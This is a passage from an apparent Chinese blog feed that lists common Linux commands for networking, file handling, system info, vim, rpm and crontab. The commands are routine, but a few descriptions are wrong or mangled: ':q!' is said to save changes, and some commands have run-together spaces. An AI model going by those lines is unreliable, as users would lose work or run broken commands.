eth0 启用一个 &#x27;eth0&#x27; 网络设备<br>ifdown eth0 禁用一个 &#x27;eth0&#x27; 网络设备<br>ifconfig eth0 <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> netmask <span class="hljs-number">255.255</span><span class="hljs-number">.255</span><span class="hljs-number">.0</span> 控制IP地址<br>ifconfig eth0 promisc 设置 &#x27;eth0&#x27; 成混杂模式以嗅探数据包 (sniffing)<br>dhclient eth0 以dhcp模式启用 &#x27;eth0&#x27;<br>route -n show routing table<br>route add -net <span class="hljs-number">0</span>/<span class="hljs-number">0</span> gw IP_Gateway configura default gateway<br>route add -net <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> netmask <span class="hljs-number">255.255</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span> gw <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> configure static route to reach network &#x27;<span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">16</span>&#x27;<br>route del <span class="hljs-number">0</span>/<span class="hljs-number">0</span> gw IP_gateway remove static route<br>echo <span class="hljs-string">&quot;1&quot;</span> &gt; /<span class="hljs-keyword">proc</span>/sys/net/ipv4/ip_forward<span class="hljs-title"> activate</span> ip<span class="hljs-title"> routing</span><br>hostname<span class="hljs-title"> show</span> hostname<span class="hljs-title"> of</span> system<span class="hljs-title"></span><br><span class="hljs-title">host</span> www.example.com<span class="hljs-title"> lookup</span> hostname<span class="hljs-title"> to</span> resolve<span class="hljs-title"> name</span> to<span class="hljs-title"> ip</span> address<span class="hljs-title"> and</span> viceversa(1)<span class="hljs-title"></span><br><span class="hljs-title">nslookup</span> www.example.com<span class="hljs-title"> lookup</span> hostname<span class="hljs-title"> to</span> resolve<span class="hljs-title"> name</span> to<span class="hljs-title"> ip</span> address<span class="hljs-title"> and</span> viceversa(2)<span class="hljs-title"></span><br><span class="hljs-title">ip</span> link<span class="hljs-title"> show</span> show<span class="hljs-title"> link</span> status<span class="hljs-title"> of</span> all<span class="hljs-title"> interfaces</span><br>mii-tool<span class="hljs-title"> eth0</span> show<span class="hljs-title"> link</span> status<span class="hljs-title"> of</span> &#x27;eth0&#x27;<span class="hljs-title"></span><br><span class="hljs-title">ethtool</span> eth0<span class="hljs-title"> show</span> statistics<span class="hljs-title"> of</span> network<span class="hljs-title"> card</span> &#x27;eth0&#x27;<span class="hljs-title"></span><br><span class="hljs-title">netstat</span> -tup<span class="hljs-title"> show</span> all<span class="hljs-title"> active</span> network<span class="hljs-title"> connections</span> and<span class="hljs-title"> their</span> PID<span class="hljs-title"></span><br><span class="hljs-title">netstat</span> -tupl<span class="hljs-title"> show</span> all<span class="hljs-title"> network</span> services<span class="hljs-title"> listening</span> on<span class="hljs-title"> the</span> system<span class="hljs-title"> and</span> their<span class="hljs-title"> PID</span><br>tcpdump<span class="hljs-title"> tcp</span> port 80<span class="hljs-title"> show</span> all<span class="hljs-title"> HTTP</span> traffic<span class="hljs-title"></span><br><span class="hljs-title">iwlist</span> scan<span class="hljs-title"> show</span> wireless<span class="hljs-title"> networks</span><br>iwconfig<span class="hljs-title"> eth1</span> show<span class="hljs-title"> configuration</span> of<span class="hljs-title"> a</span> wireless<span class="hljs-title"> network</span> card<span class="hljs-title"></span><br><span class="hljs-title">hostname</span> show<span class="hljs-title"> hostname</span><br>host<span class="hljs-title"> www.example.com</span> lookup<span class="hljs-title"> hostname</span> to<span class="hljs-title"> resolve</span> name<span class="hljs-title"> to</span> ip<span class="hljs-title"> address</span> and<span class="hljs-title"> viceversa</span><br>nslookup<span class="hljs-title"> www.example.com</span> lookup<span class="hljs-title"> hostname</span> to<span class="hljs-title"> resolve</span> name<span class="hljs-title"> to</span> ip<span class="hljs-title"> address</span> and<span class="hljs-title"> viceversa</span><br>whois<span class="hljs-title"> www.example.com</span> lookup<span class="hljs-title"> on</span> Whois<span class="hljs-title"> database</span><br></code></pre></td></tr></table></figure><ol><li>列出目录内容</li></ol><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">ls</span> <span class="hljs-literal">-a</span>：显示所有文件（包括隐藏文件）；<br><span class="hljs-built_in">ls</span> <span class="hljs-literal">-l</span>：显示详细信息；<br><span class="hljs-built_in">ls</span> <span class="hljs-literal">-R</span>：递归显示子目录结构；<br><span class="hljs-built_in">ls</span> <span class="hljs-literal">-ld</span>：显示目录和链接信息；<br>ctrl+<span class="hljs-built_in">r</span>：历史记录中所搜命令（输入命令中的任意一个字符）；<br>Linux中以.开头的文件是隐藏文件；<br><span class="hljs-built_in">pwd</span>:显示当前目录<br></code></pre></td></tr></table></figure><ol><li>查看文件的类型</li></ol><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">file</span>:查看文件的类型<br></code></pre></td></tr></table></figure><ol><li>复制文件目录</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">1、<span class="hljs-built_in">cp</span>：复制文件和目录 <span class="hljs-built_in">cp</span>源文件（文件夹）目标文件（文件夹）<br><br>常用参数：-r:递归复制整个目录树；-v：显示详细信息；<br>复制文件夹时要在<span class="hljs-built_in">cp</span>命令后面加一个-r参数：<br>如：<span class="hljs-built_in">cp</span> -r 源文件夹  目标文件夹<br>2、<span class="hljs-built_in">touch</span>+文件名：当文件不存在的时候，创建相应的文件；当文件存在的时候，修改文件的创建时间。<br><br>功能：生成一个空文件或修改文件的存取/修改的时间记录值。<br><span class="hljs-built_in">touch</span> * ：将当前下的文件时间修改为系统的当前时间<br><span class="hljs-built_in">touch</span> –d 20040210 <span class="hljs-built_in">test</span>：将<span class="hljs-built_in">test</span>文件的日期改为20040210<br><span class="hljs-built_in">touch</span> abc　：若abc文件存在，则修改为系统的当前时间；若不存在，则生成一个为当前时间的空文件<br>3、<span class="hljs-built_in">mv</span> 文件 目标目录：移动或重命名文件或目录（如果指定文件名，则可以重命名文件）。可以将文件及目录移到另一目录下，或更改文件及目录的名称。<br><br>格式为：<span class="hljs-built_in">mv</span> [参数]&lt;源文件或目录&gt; &lt;目标文件或目录&gt;<br>mva.txt ../：将a.txt文件移动上层目录<br><span class="hljs-built_in">mv</span> a.txt b.txt：将a.txt改名为b.txt<br>mvdir2 ../：将dir2目录上移一层<br>4、<span class="hljs-built_in">rm</span>：删除文件；<br><br>常用参数：-i：交互式   -r：递归的删除包括目录中的所有内容<br>5、<span class="hljs-built_in">mkdir</span> +文件夹名称：创建文件夹；<br>6、<span class="hljs-built_in">rm</span> -r +文件夹名称：删除文件夹（空文件夹和非空文件夹都可删除）<br><br><span class="hljs-built_in">rmdir</span> 文件夹名称：删除文件夹（只能删除空文件夹）<br>7、<span class="hljs-built_in">mkdir</span>  -p dir1/dir2 ：在当前目录下创建dir1目录，并在dir1目录下创建dir2目录， 也就是连续创建两个目录（dir1/和dir1/dir2）<br>8、<span class="hljs-built_in">rmdir</span> –p dir1/dir2：删除dir1下的dir2目录，若dir1目录为空也删除它<br>9、<span class="hljs-built_in">rm</span> * ：删除当前目录下的所有文件<br>10、-f参数：强迫删除文件 <span class="hljs-built_in">rm</span> –f  *.txt：强迫删除所有以后缀名为txt文件<br>11、-i参数：删除文件时询问<br><br><span class="hljs-built_in">rm</span>　–i  * ：删除当前目录下的所有文件会有如下提示：<br><span class="hljs-built_in">rm</span>:backup:is a directory　　　 遇到目录会略过<br><span class="hljs-built_in">rm</span>: remove ‘myfiles.txt’ ? Y<br>删除文件时会询问,可按Y或N键表示允许或拒绝删除文件　<br>12、-r参数：递归删除（连子目录一同删除，这是一个相当常用的参数）<br><br><span class="hljs-built_in">rm</span>  -r <span class="hljs-built_in">test</span> ：删除<span class="hljs-built_in">test</span>目录（含<span class="hljs-built_in">test</span>目录下所有文件和子目录）<br><span class="hljs-built_in">rm</span>  -r  *：删除所有文件（含当前目录所有文件、所有子目录和子目录下的文件） 一般在删除目录时r和f一起用，避免麻烦<br><span class="hljs-built_in">rm</span>  -rf <span class="hljs-built_in">test</span> ：强行删除、不加询问<br>13、grep：功能：在文件中搜索匹配的字符并进行输出<br><br>格式：grep[参数] &lt;要找的字串&gt; &lt;要寻找字 串的源文件&gt;<br>greplinux test.txt：搜索test.txt文件中字符串linux并输出<br>14、<span class="hljs-built_in">ln</span>命令<br><br>功能：在文件和目录之间建立链接<br>格式：<span class="hljs-built_in">ln</span> [参数] &lt;源文件或目录&gt; &lt;目标文件或目录&gt;<br>链接分“软链接”和“硬链接”<br>1.软链接:<br><span class="hljs-built_in">ln</span>–s /usr/share/do  doc ：创建一个链接文件doc,并指向目录/usr/share/do<br>2.硬链接:<br><span class="hljs-built_in">ln</span>  /usr/share/test  hard：创建一个硬链接文件hard，这时对于<span class="hljs-built_in">test</span>文件对应 的存储区域来说，又多了一个文件指向它<br></code></pre></td></tr></table></figure><ol><li>系统常用命令</li></ol><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs stata">1、显示命令<br><br>date:查看或设置当前系统的时间：格式化显示时间：+%Y--%<span class="hljs-keyword">m</span>--%<span class="hljs-keyword">d</span>；<br>date -s:设置当前系统的时间<br>hwclock(clock)：显示硬件时钟时间(需要管理员权限)；<br>cal：查看日历<br>格式cal [参数] 月年<br>cal：显示当月的日历   cal4 2004 ：显示2004年4月的日历<br>cal- y 2003：显示2003年的日历<br>uptime：查看系统运行时间<br>2、输出查看命令<br><br>echo：显示输入的内容  追加文件echo <span class="hljs-string">&quot;liuyazhuang&quot;</span> &gt;&gt; liuyazhuang.txt<br><span class="hljs-keyword">cat</span>：显示文件内容,也可以将数个文件合并成一个文件。<br>格式：格式：<span class="hljs-keyword">cat</span>[参数]&lt;文件名&gt;<br><span class="hljs-keyword">cat</span>  <span class="hljs-keyword">test</span>.txt：显示<span class="hljs-keyword">test</span>.txt文件内容<br><span class="hljs-keyword">cat</span>  <span class="hljs-keyword">test</span>.txt | <span class="hljs-keyword">more</span>  ：逐页显示<span class="hljs-keyword">test</span>.txt文件中的内容<br><span class="hljs-keyword">cat</span>  <span class="hljs-keyword">test</span>.txt &gt;&gt; test1.txt ：将<span class="hljs-keyword">test</span>.txt的内容附加到test1.txt文件之后<br><span class="hljs-keyword">cat</span>  <span class="hljs-keyword">test</span>.txt test2.txt &gt;readme.txt　: 将<span class="hljs-keyword">test</span>.txt和test2.txt文件合并成readme.txt 文件<br>head:显示文件的头几行（默认10行） -<span class="hljs-keyword">n</span>:指定显示的行数格式：head -<span class="hljs-keyword">n</span> 文件名<br>tail：显示文件的末尾几行（默认10行）-<span class="hljs-keyword">n</span>：指定显示的行数   -f：追踪显示文件更新 （一般用于查看日志，命令不会退出，而是持续显示新加入的内容）<br>格式：格式：tail[参数]&lt;文件名&gt;<br>tail-10 /etc/passwd ：显示/etc/passwd/文件的倒数10行内容<br>tail+10 /etc/passwd ：显示/etc/passwd/文件从第10行开始到末尾的内容<br><span class="hljs-keyword">more</span>：用于翻页显示文件内容（只能向下翻页）<br><span class="hljs-keyword">more</span>命令是一般用于要显示的内容会超过一个画面长度的情况。为了避免画  面显示时瞬间就闪过去，用户可以使用<span class="hljs-keyword">more</span>命令，让画面在显示满一页时暂停，此时可按空格健继续显示下一个画面，或按Q键停止显示。<br><span class="hljs-keyword">ls</span>  -al  |<span class="hljs-keyword">more</span>：以长格形式显示etc目录下的文件列表，显示满一个画面便暂停，可 按空格键继续显示下一画面，或按Q键跳离<br>less：翻页显示文件内容（带上下翻页）按下上键分页，按q退出、‘<br>less命令的用法与<span class="hljs-keyword">more</span>命令类似，也可以用来浏览超过一页的文件。所不同  的是less 命令除了可以按空格键向下显示文件外，还可以利用上下键来卷动文件。当要结束浏览时，只要在less命令的提示符“：”下按Q键即可。<br><span class="hljs-keyword">ls</span>  -al | less：以长格形式列出/etc目录中所有的内容。用户可按上下键浏览或按Q键跳离<br>3、查看硬件信息<br><br>Ispci：查看PCI设备  -v：查看详细信息<br>Isusb：查看USB设备 -v：查看详细信息<br>Ismod：查看加载的模块(驱动)<br>4、关机、重启<br><br>shutdown关闭、重启计算机<br>shutdown[关机、重启]时间  -<span class="hljs-keyword">h</span>关闭计算机   -r：重启计算机<br>如：立即关机：shutdown -<span class="hljs-keyword">h</span> now<br>10分钟后关机：shutdown -<span class="hljs-keyword">h</span> +10<br>23:30分关机：shutdown -<span class="hljs-keyword">h</span> 23:30<br>立即重启：shutdown -r now<br>poweroff：立即关闭计算机<br>reboot：立即重启计算机<br>5、归档、压缩<br><br><span class="hljs-keyword">zip</span>:压缩文件  <span class="hljs-keyword">zip</span> liuyazhuang.<span class="hljs-keyword">zip</span> myfile  格式为：“<span class="hljs-keyword">zip</span> 压缩后的<span class="hljs-keyword">zip</span>文件文件名”<br>unzip：解压文件  unzip liuyazhuang.<span class="hljs-keyword">zip</span><br>gzip：压缩文件 gzip 文件名<br>tar：归档文件<br>tar -cvf <span class="hljs-keyword">out</span>.tar liuyazhuang  打包一个归档（将文件<span class="hljs-string">&quot;liuyazhuang&quot;</span>打包成一个归档）<br>tar -xvf liuyazhuang.tar     释放一个归档（释放liuyazhuang.tar归档）<br>tar -cvzf backup.tar.gz/etc  <br>-z参数将归档后的归档文件进行gzip压缩以减少大小。<br>-c：创建一个新tar文件<br>-v：显示运行过程的信息<br>-f：指定文件名<br>-z：调用gzip压缩命令进行压缩<br>-t：查看压缩文件的内容<br>-x：解开tar文件<br>tar  -cvf <span class="hljs-keyword">test</span>.tar  *：将所有文件打包成<span class="hljs-keyword">test</span>.tar,扩展名.tar需自行加上<br>tar  -zcvf <span class="hljs-keyword">test</span>.tar.gz  *：将所有文件打包成<span class="hljs-keyword">test</span>.tar,再用gzip命令压缩<br>tar -tf   <span class="hljs-keyword">test</span>.tar ：查看<span class="hljs-keyword">test</span>.tar文件中包括了哪些文件<br>tar -xvf <span class="hljs-keyword">test</span>.tar       将<span class="hljs-keyword">test</span>.tar解开<br>tar -zxvf foo.tar.gz   解压缩<br>gzip各gunzip命令<br>gziptest.txt ：压缩文件时，不需要任何参数<br>gizp–<span class="hljs-keyword">l</span> <span class="hljs-keyword">test</span>.txt.gz：显示压缩率<br>6、查找<br><br>locate：快速查找文件、文件夹：locate keyword<br>此命令需要预先建立数据库，数据库默认每天更新一次，可用updatedb命令手工建立、更新数据库。欢迎关注我们，公号终码一生。<br>find查找位置查找参数<br>如：<br>find . -name *liuyazhuang* 查找当前目录下名称中含有<span class="hljs-string">&quot;liuyazhuang&quot;</span>的文件<br>find / -name *.<span class="hljs-keyword">conf</span>  查找根目录下（整个硬盘）下后缀为.<span class="hljs-keyword">conf</span>的文件<br>find / -perm 777 查找所有权限是777的文件<br>find / -<span class="hljs-keyword">type</span> <span class="hljs-keyword">d</span> 返回根目录下所有的目录<br>find . -name <span class="hljs-string">&quot;a*&quot;</span>-exec <span class="hljs-keyword">ls</span> -<span class="hljs-keyword">l</span> &#123;&#125; \;<br>find功能：用来寻找文件或目录。<br>格式：find [&lt;路径&gt;] [匹配条件]<br>find / -name httpd.<span class="hljs-keyword">conf</span>  搜索系统根目录下名为httpd.<span class="hljs-keyword">conf</span>的文件<br>7、ctrl+c :终止当前的命令<br>8、who或w命令<br><br>功能：查看当前系统中有哪些用户登录<br>格式：who/w[参数]<br>9、dmesg命令<br>功能：显示系统诊断信息、操作系统版本号、物理内存的大小以及其它信息<br>10、df命令<br>功能：用于查看文件系统的各个分区的占用情况<br><br>11、du命令<br><br>功能：查看某个目录中各级子目录所使用的硬盘空间数<br>格式：du [参数] &lt;目录名&gt;<br>12、free命令<br><br>功能：用于查看系统内存，虚拟内存（交换空间）的大小占用情况<br></code></pre></td></tr></table></figure><ol><li>VIM</li></ol><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs vim">VIM是一款功能强大的命令行文本编辑器，在Linux中通过<span class="hljs-keyword">vim</span>命令可以启动<span class="hljs-keyword">vim</span>编辑器。<br>一般使用<span class="hljs-keyword">vim</span> + 目标文件路径 的形式使用<span class="hljs-keyword">vim</span><br><br>如果目标文件存在，则<span class="hljs-keyword">vim</span>打开目标文件，如果目标文件不存在，则<span class="hljs-keyword">vim</span>新建并打开该文件<br>:q：退出<span class="hljs-keyword">vim</span>编辑器<br>VIM模式<br><span class="hljs-keyword">vim</span>拥有三种模式：<br>（<span class="hljs-number">1</span>）命令模式（常规模式）<br><br><span class="hljs-keyword">vim</span>启动后，默认进入命令模式，任何模式都可以通过esc键回到命令模式（可以多按几次），命令模式下可以键入不同的命令完成选择、复制、粘贴、撤销等操作。<br>命名模式常用命令如下：<br>i : 在光标前插入文本；<br><span class="hljs-keyword">o</span>:在当前行的下面插入新行；<br>dd:删除整行；<br>yy：将当前行的内容放入缓冲区（复制当前行）<br>n+yy :将n行的内容放入缓冲区（复制n行）<br><span class="hljs-keyword">p</span>:将缓冲区中的文本放入光标后（粘贴）<br><span class="hljs-keyword">u</span>：撤销上一个操作<br>r:替换当前字符<br>/ 查找关键字<br>（<span class="hljs-number">2</span>）插入模式<br><br>在命令模式下按 <span class="hljs-string">&quot; i &quot;</span>键，即可进入插入模式，在插入模式可以输入编辑文本内容，使用esc键可以返回命令模式。<br>（<span class="hljs-number">3</span>）<span class="hljs-keyword">ex</span>模式<br><br>在命令模式中按<span class="hljs-string">&quot; : &quot;</span>键可以进入<span class="hljs-keyword">ex</span>模式，光标会移动到底部，在这里可以保存修改或退出<span class="hljs-keyword">vim</span>.<br>ext模式常用命令如下：<br>:<span class="hljs-keyword">w</span> ：保存当前的修改<br>:q ：退出<br>:q! ：强制退出，保存修改<br>:<span class="hljs-keyword">x</span>  :保存并退出，相当于:<span class="hljs-keyword">wq</span><br>:<span class="hljs-keyword">set</span> <span class="hljs-keyword">number</span> 显示行号<br>:! 系统命令  执行一个系统命令并显示结果<br>:<span class="hljs-keyword">sh</span> ：切换到命令行，使用ctrl+d切换回<span class="hljs-keyword">vim</span><br><span class="hljs-number">28</span>. 软件包管理命令(RPM)<br><br><span class="hljs-number">1</span>、软件包的安装<br><br>使用RPM命令的安装模式可以将软件包内所有的组件放到系统中的正确路径，安装软件包的命令是:rpm –ivh <span class="hljs-keyword">wu</span>-ftpd-<span class="hljs-number">2.6</span>.<span class="hljs-number">2</span>-<span class="hljs-number">8</span>.i386.rpm<br>i：作用rpm的安装模式 v: 校验文件信息h: 以＃号显示安装进度<br><span class="hljs-number">2</span>、软件包的删除<br><br>删除模式会将指定软件包的内容全部删除，但并不包括已更改过的配置文件，删除RPM软件包的命令如下：rpm –<span class="hljs-keyword">e</span>  <span class="hljs-keyword">wu</span>-ftpd<br>注意：这里必须使用软件名“<span class="hljs-keyword">wu</span>-ftpd”或”<span class="hljs-keyword">wu</span>-ftpd-<span class="hljs-number">2.6</span>.<span class="hljs-number">2</span>-<span class="hljs-number">8</span>而不是使用当初安装时的软件包名.<span class="hljs-keyword">wu</span>-ftpd-<span class="hljs-number">2.6</span>.<span class="hljs-number">2</span>-<span class="hljs-number">8</span>.i386.rpm<br><span class="hljs-number">3</span>、软件包升级<br><br>升级模式会安装用户所指定的更新版本，并删除已安装在系统中的相同软件包，升级软件包命令如下：rpm –Uvh <span class="hljs-keyword">wu</span>-ftpd-<span class="hljs-number">2.6</span>.<span class="hljs-number">2</span>-<span class="hljs-number">8</span>.i386.rpm  –Uvh：升级参数<br><span class="hljs-number">4</span>、软件包更新<br><br>更新模式下，rpm命令会检查在命令行中所指定的软件包是否比系统中原有的软件 包更新。如果情况属实，rpm命令会自动更新指定的软件包；反之，若系统中并没有指定软件包的较旧版本，rpm命令并不会安装此软件包。而在升级模式下，不管系统中是否有较旧的版本，rpm命令都会安装指定的软件包。<br>rpm –Fvhwu-ftpd-<span class="hljs-number">2.6</span>.<span class="hljs-number">2</span>-<span class="hljs-number">8</span>.i386.rpm   -Fvh：更新参数<br><span class="hljs-number">5</span>、软件包查询<br><br>若要获取RPM软件包的相关信息，可以使用查询模式。使用-q参数可查询一个已   安装的软件包的内容<br>rpm  –q <span class="hljs-keyword">wu</span>-ftpd<br>查询软件包所安装的位置：rpm –ql package-name<br>rpm –ql xv (<span class="hljs-keyword">l</span>参数：显示文件列表)<br></code></pre></td></tr></table></figure><h2 id="创建"><a href="#创建" class="headerlink" title="创建"></a>创建</h2><ol><li>打开终端或者 SSH 登录到 CentOS 6.9 服务器。</li><li>运行以下命令以编辑 crontab 文件：</li></ol><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">crontab -e</span><br></code></pre></td></tr></table></figure><p>在编辑器中添加您的定时任务。任务应该遵循以下格式：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-symbol">*</span> <span class="hljs-symbol">*</span> <span class="hljs-symbol">*</span> <span class="hljs-symbol">*</span> <span class="hljs-symbol">*</span> command<br>- - - - -<br>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<br>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> ----- Day of the week (0 - 7) (Sunday is both 0 and 7)</span><br><span class="hljs-string"></span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> ------- Month (1 - 12)</span><br><span class="hljs-string"></span>|<span class="hljs-string"> </span>|<span class="hljs-string"> --------- Day of the month (1 - 31)</span><br><span class="hljs-string"></span>|<span class="hljs-string"> ----------- Hour (0 - 23)</span><br><span class="hljs-string">------------- Minute (0 - 59)</span><br></code></pre></td></tr></table></figure><p>例如，以上命令将每天的上午 10 点运行 /path/to/command：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span><span class="hljs-number">10</span> * * * /path/<span class="hljs-keyword">to</span>/command<br></code></pre></td></tr></table></figure><p>例如，以下命令将在每周三的晚上9点30分运行一个脚本：</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">30 </span><span class="hljs-number">21</span> * * <span class="hljs-number">3</span> /path/<span class="hljs-keyword">to</span>/script.sh<br></code></pre></td></tr></table></figure><p>该命令的解释如下：</p><ul><li>分钟：30</li><li>小时：21</li><li>日：任意</li><li>月份：任意</li><li>星期几：3（星期三）</li></ul><h2 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h2><p>如果需要每分钟执行一次任务，可以在 crontab 中使用通配符 * 来代表“每”，如下所示：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown">javascriptCopy code<br><span class="hljs-bullet">*</span> <span class="hljs-emphasis">* *</span> <span class="hljs-emphasis">* *</span> /root/script.sh <br></code></pre></td></tr></table></figure><p>即/root有脚本script.sh, 此时每隔一分钟就会执行一次,要注意如果没有执行,注意检查用户是否有权限.</p><h2 id="查看定时任务"><a href="#查看定时任务" class="headerlink" title="查看定时任务"></a>查看定时任务</h2><p>crontab -l</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">[root@xiaohua ~]<span class="hljs-comment"># crontab -l</span><br>* * * * * <span class="hljs-regexp">/root/</span>script.sh <br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Linux 系统管理命令</title>
    <link href="/2023/07/18/Linux-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4/"/>
    <url>/2023/07/18/Linux-%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4/</url>
    
